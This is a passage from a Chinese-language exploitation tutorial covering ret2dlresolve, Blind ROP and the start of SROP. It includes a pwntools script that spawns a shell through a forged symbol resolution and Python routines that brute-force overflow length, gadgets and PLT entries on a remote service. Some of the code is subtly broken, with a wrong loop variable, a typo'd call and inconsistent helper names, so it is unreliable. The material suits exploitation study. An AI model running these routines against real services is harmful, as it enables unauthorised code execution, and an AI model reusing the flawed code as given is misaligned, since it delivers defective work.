Elf64_Sym;</span><br></pre></td></tr></table></figure><p>.rel.plt 也是一个数组，数组的每一项 rel 的结构如下所示 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;</span><br><span class="line">    Elf32_Word       r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM (i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE (i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO (sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p> 攻击方法：</p><ol><li><p> 程序没有开启 RELRO</p><p> 那么我们可以任意修改.dynamic 段（数组）里的内容。首先在一块可控的内存区域内伪造一个字符串表，将 func 字符串（func 可以为 libc 中的任意目标函数，例如 read，puts 等）替换为 system 字符串，之后修改.dynamic 里的字符串表地址（.dynstr，该地址很容易通过 tag 查到）为我们伪造的字符串表地址，最后通过栈溢出修改 ret 为 func@plt 的第二条指令的地址，也就是 <code>push func_index</code>，这样就会为 func 调用一次_dl_runtime_resolve，这样根据符号名解析到的就是 system 函数，最后会执行 system 函数。</p></li><li><p> 开启了 Partial RELRO</p><p> 这时就不可以修改.dynamic 中的值了，但是可以通过伪造.rel.plt 表实现。虽然从.dynamic 中取出的.rel.plt 地址我们不可以控制，但是 reloc_index 是在栈中，因此可以被我们控制，所以通过.rel.plt 地址 + reloc_index 我们就可以控制重定位表指针 rel 的值，精心构造的 reloc_index 可以让 rel 指向我们伪造的一个重定位表项，这时 <code>rel-&gt;r_info</code> 我们也可以控制，就可以控制.dynsym 动态链接符号表中的下标。同样类似控制 rel，虽然从.dynamic 中取出的.dynsym 地址不可以控制，但是下标是可以控制的，因此我们也可以控制.dynsym 的地址 + 下标偏移得到对应符号表项的指针 sym，可以使 sym 指向我们伪造的一个 sym 表项，在伪造的 sym 表项中我们可以控制 <code>sym-&gt;st_name</code>，这样我们就可以控制.dynstr 地址 +<code>sym-&gt;st_name</code> 所指向的的符号名为我们控制的字符串，例如 system，同样调用_dl_runtime_resolve 的时候可以执行 system，最后需要注意的是 <code>rel-&gt;r_offset</code> 指向的地址需要可写。综上所述，具体利用步骤如下。</p><ol><li><p> 计算 reloc_index。通过 <code>objdump -s -j .rel.plt ./pwn</code> 获取.rel.plt 在程序中的偏移 offset，因此 <code>reloc_index = fake_rel_plt_addr - offset</code></p></li><li><p> 找一个可控内存伪造 rel 表项，其中 r_offset 需要可写 </p></li><li><p> 计算 rel 表项中的 r_info。通过 <code>objdump -s -j .dynsym ./pwn</code> 获取.dynsym 在程序中的偏移 offset，因此 <code>r_info = ((fake_dynsym_addr - offset) / 0x10)&lt;&lt;8 + 0x7</code></p></li><li><p> 找一个可控内存伪造 sym 表项。表项中其他值都不重要，重要的是 st_name 的值。</p></li><li><p> 计算 sym 中的 st_name。通过 <code>objdump -s -j .dynstr ./pwn</code> 获取.dynstr 在程序中的偏移 offset，因此 <code>st_name = fake_dynstr_addr - offset</code></p></li><li><p> 找一个可控内存 fake_dynstr_addr 写入想要解析的符号字符串，例如 system</p></li><li><p> 至此 rel 表项，sym 表项和符号都伪造完成，也计算出了 reloc_index，所以直接将 reloc_index 放在栈顶，然后跳转到 plt 表项中直接 <code>jmp plt [0]</code> 的地址即可。</p></li><li><p> 若栈上的值实在不好控制，则可以通过栈迁移将栈转移到 bss 段在进行操作，需要注意内存对齐的情况。</p></li><li><p> 由于上述手工步骤过于复杂，而且有很多重复操作的步骤，也容易出错，因此 pwntools 中集成了关于 ret2dlreslove 的利用方法，下面的示例来自 ctf-wiki。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF (<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP (context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload (elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools will help us choose a proper addr</span></span><br><span class="line"><span class="comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span></span><br><span class="line">rop.read (<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line"></span><br><span class="line">rop.ret2dlresolve (dlresolve)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">112</span> + rop.chain () + <span class="string">&#x27;a&#x27;</span> * <span class="number">256</span> + dlresolve.payload</span><br><span class="line"></span><br><span class="line">io = process (<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">io.sendline (payload)</span><br><span class="line">io.interactive ()</span><br></pre></td></tr></table></figure></li></ol></li><li><p> 开启了 Full RELRO</p><p> 这种情况下程序中使用的动态链接的函数在程序开始执行之前就被解析完毕，_dl_runtime_reslove 和 got 表也就用不到了，而且.dynamic 和 got 表都不可写，无法利用。</p></li></ol><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p>BROP 就是 Blind ROP，也就是 ROP 盲打，指在没有程序可执行文件的情况下利用 ROP 进行盲打。</p><p> 攻击前提：</p><ol><li> 必须存在栈溢出可以覆盖 ret 地址劫持控制流 </li><li> 程序崩溃后可以自动重启，并且重启后地址不变（例如 nginx，mysql，apache，openssh 等服务器）</li></ol><p> 攻击步骤：</p><ol><li><p> 获取栈溢出长度 </p><p> 非常简单，通过枚举即可，每次增加一个字节直到程序报错 </p></li><li><p> 绕过 canary</p><p> 通过逐字节爆破 canary，主要用了 0x82 节中的爆破方法获取到 canary</p></li><li><p>rop</p><p> 找到 canary 以后我们就可以控制 ret 了，这时候就需要找到合适的 garget 来形成 rop 链。</p></li></ol><p> 由于我们不知道程序里的代码，所以想直接找到一个 syscall 几乎是不可能的，因此首要任务就是先想办法可以打印出程序的内存，使我们可以获取更多的信息，这是我们的目标。即然需要打印程序，那么就需要函数调用 / 系统调用，首先就需要找到可以控制寄存器的 gadgets。通过 0x85 节我们可以知道在 csu 中有一段通用的 gadgets，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure><p> 但是我们想控制的是 rdi，rsi 和 rdx 这三个寄存器（这三个寄存器中保存函数参数），但是从 csu 的 gadget 中，如果从 0x400621（0x40061A+7）处开始，这一段 gadget 就变成了 <code>pop rsi; pop r15; ret</code>，如果从 0x400623（0x40061A+9）处开始，这一段 gadget 就变成了 <code>pop rdi; ret</code>，这样我们就有了两个已知的可以控制 rdi 和 rsi 的 gadgets，但是 gadgets 的具体位置，我们还是一无所知，只能通过猜测 + 测试的方法获取 gadgets。</p><p> 首先我们将程序的 gadgets 分为 3 类：stop gadgets，trap gadgets 和 probe gadgets。Probe gadgets 就是我们猜测并且需要测试的 gadgets，对于 64 位程序，可以直接从 0x400000 开始尝试，如果不成功则程序可能开启了 PIE，或者这是 32 位的程序。Stop gadgets 是一段不会使程序立即崩溃的 gadgets，也就是说程序控制流跳转到 stop gadgets 以后还可以正常运行一段时间，之后可能会发生崩溃。Trap gadgets 则是一段可以立即使程序崩溃的 gadgets，其实 trap gadgets 可以不是一段 gadgets，甚至可以是一个非法地址，只要程序跳转到 trap 以后可以立即崩溃就行。最后，通过 stop 和 trap 在栈上的不同布局，我们就可以测试我们猜测的 prob 是否是一段正确的 gadgets（其实原理上类似 SQL 注入的时间盲注），有如下几个例子。</p><ol><li><p> 测试不会对栈进行操作的 gadgets，例如 <code>ret</code>，<code>xor eax, eax; ret</code> 等，若没有进行 pop 或 push，则会直接跳转到 stop，程序不会立即崩溃，否则就会跳转到 trap，程序会立即崩溃，后续几个例子的原理相同。</p><p> buf | canary | probe | stop | trap | trap | … |</p></li><li><p> 测试只 pop 一次的 gadgets。</p><p> buf | canary | probe | trap | stop | trap | trap | … |</p></li><li><p> 测试 pop 了两次的 gadgets，可以依此类推寻找 pop 多次的 gadgets</p><p> buf | canary | probe | trap | trap | stop | trap | trap | .. |</p></li><li><p> 测试 probe 是不是一个 stop gadgets，若 probe 是一个 stop gadgets，则程序不会立即崩溃，否则就会立即崩溃 </p><p> buf | canary | probe | trap | trap | … |</p></li><li><p> 找到到 csu 中那连续 6 个 pop 的 gadgets（非常重要，找到这个 gadgets 就相当于可以控制很多寄存器）</p><p> buf | canary | probe | trap | trap | trap | trap | trap | trap | stop | trap | trap | … |</p></li></ol><p> 关于识别 plt 表，plt 相对比较稳定，跳转到 plt 以后程序一般不会崩溃。plt 表的每一项都是 16 字节长，所以若连续 16 次测试 probe 的时候程序都没有崩溃（例如从 0x400000 开始尝试，尝试到 0x400010，这些 probe 都是 gadgets），那么很可能遇到了 plt 表。此外，plt 中的一项包含了 3 条指令 <code>jmp func@got; push func_index; jmp plt [0]</code>，第一条指令 jmp 长 6 字节，第二条指令 push 长 5 字节，最后一个 jmp 指令长 5 字节，因此可以通过前后偏移 6 字节来确定哪一个 probe 是 plt 表项的中间（即是处于 push 还是处于第一个 jmp）。</p><p> 此时虽然我们找到了 plt 表，但是还不能确定哪一个是输出函数（例如 puts），我们最终的目标是调用输出函数打印程序内存。例如寻找 puts 函数，我们只需要控制 rdi 即可（puts 只接受一个参数），那么我们可以依次遍历每一个 plt 表项，每次遍历的 step 为 16 字节，之后我们控制 rdi 为程序的开头也就是 0x400000（未开启 PIE），ELF 开头的 4 个字节一般为 <code>\x7fELF</code>，所以如果某一个 plt 表项调用完以后发现程序输出了这 4 个字节，那么那就是 puts 的 plt 表项，找到了 puts 的地址以后我们就可以随心所欲输出程序地址的内存了，甚至可以把代码段全打印出来供我们离线寻找更多的 gadgets。</p><p> 综上所述，brop 的一般过程如下所述。首先确定溢出长度，exp 如下，注意，若遇到了 canary 则该函数返回的仅为 buf 长度，若没有 canary（比较少见），则该函数返回的包括了 old ebp 的长度。其中 <code>get_remote_conn</code> 函数可以获取一个 remote conn，<code>conn_send_recv</code> 函数负责发送和接收 data。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_overflow_length</span>():</span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn ()</span><br><span class="line">            output = conn_send_recv (conn, <span class="string">&#x27;a&#x27;</span> * length)</span><br><span class="line">            conn.close ()</span><br><span class="line">            <span class="comment"># OK means remote not crash.</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># Crash and output something else.</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close ()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> length - <span class="number">1</span></span><br></pre></td></tr></table></figure><p> 之后需要寻找 stop gadgets，exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_gadget</span>(<span class="params">buf_length, canary=<span class="literal">None</span></span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64 (canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn ()</span><br><span class="line">            conn_send_recv (conn. payload + p64 (addr))</span><br><span class="line">            conn.close ()</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close ()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p> 找到 stop gadgets 以后就成功了一半了，剩下的就是寻找 plt 的地址以及遍历 plt 找到 puts 的地址。首先是寻找 plt 的 exp，注意程序可能不止一处连续 16 次都不崩溃，所以最好根据不同的 start_addr 多尝试几次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_plt</span>(<span class="params">start_addr, buf_length, stop_gadgets, canary=<span class="literal">None</span></span>):</span><br><span class="line">    addr = start_addr  <span class="comment"># Which address you want to start.</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64 (canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += <span class="string">&#x27;% s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += p64 (stop_gadgets)  <span class="comment"># Stop gadgets addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 Traps.</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn ()</span><br><span class="line">            conn_send_recv (conn, payload % p64 (addr))</span><br><span class="line">            conn.close ()</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == <span class="number">16</span>:</span><br><span class="line">                <span class="keyword">return</span> addr - <span class="number">16</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close ()</span><br><span class="line">            count = <span class="number">0</span></span><br></pre></td></tr></table></figure><p> 寻找 csu 中的 gadgets 地址 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_csu</span>(<span class="params">buf_legnth, stop_gadgets, canary=<span class="literal">None</span></span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64 (canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += <span class="string">&#x27;% s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">6</span>  <span class="comment"># 6 traps</span></span><br><span class="line">    payload += p64 (stop_gadgets)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 traps</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote ()</span><br><span class="line">            output = conn_send_recv (conn, payload % p64 (addr))</span><br><span class="line">            conn.close ()</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close ()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure><p> 找到 csu 的 gadgets 地址以后，通过偏移 9 就可以得到 <code>pop rdi; ret</code> 的 gadgets，这样我们就可以控制 puts 的参数，然后是寻找 puts 的 plt 地址（其实也可以把 step 从 16 调整为 1）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_plt</span>(<span class="params">plt_addr, buf_length, pop_rdi_ret, stop_gadgets, canary=<span class="literal">None</span></span>):</span><br><span class="line">    addr = plt_addr  <span class="comment"># plt address</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64 (canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64 (pop_rdi_ret)</span><br><span class="line">    payload += p64 (<span class="number">0x400000</span>)  <span class="comment"># # ELF start address</span></span><br><span class="line">    payload += <span class="string">&#x27;% s&#x27;</span>  <span class="comment"># Probe addr</span></span><br><span class="line">    payload += p64 (stop_gadgets)  <span class="comment"># Stop gadgets addr</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span>  <span class="comment"># 10 Traps.</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote ()</span><br><span class="line">            output = conn_send_recv (conn, payload % p64 (addr))</span><br><span class="line">            conn.close ()</span><br><span class="line">            <span class="keyword">if</span> output.startswith (<span class="string">&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close ()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[!] Crash found! Maybe invalid plt address. continue finding...&#x27;</span>)</span><br><span class="line">        addr += <span class="number">16</span></span><br></pre></td></tr></table></figure><p> 最后就是调用 puts 打印各种地址内存了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">addr, puts_plt, buf_length, pop_rdi_ret, stop_gadgets, canary=<span class="literal">None</span></span>):</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span class="line">        payload += p64 (canary)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>  <span class="comment"># old rbp</span></span><br><span class="line">    payload += p64 (pop_rdi_ret)</span><br><span class="line">    payload += p64 (addr)</span><br><span class="line">    payload += p64 (puts_plt)</span><br><span class="line">    payload += p64 (stop_gadgets)</span><br><span class="line">       data = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = get_remote ()</span><br><span class="line">        data = conn_send_recv (conn, payload)</span><br><span class="line">        conn.close ()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            data = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        conn.close ()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>SROP 即 Sigreturn-Oriented Programming（面向 Sigreturn 编程），sigreturn 是一个系统调用，当 unix 系统发生 signal 的时候会被间接调用。</p><p> 当内核向一个进程发送一个 signal 的时候，该进程会被暂时挂起，然后进入内核态，在进入内核态之前，内核会将进程的上下文保存在栈中，这个上下文被称为 ucontext，其中包含了当前所有寄存器的值，之后将 signal 信息也就是 siginfo 压入栈中，然后将指向 sigreturn 系统调用的地址压入栈中，这样内核态执行完毕以后就可以执行 sigreurn 系统调用恢复保存在栈中的进程所有寄存器的值，其中，ucontext 以及 siginfo 被称为 Signal Frame。32 位 sigreturn 的调用号位 77，64 位 sigreturn 的调用号位 15。</p><p>32 位系统下的 Signal Frame 结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>64 位系统下的 Signal Frame 结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding [<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span 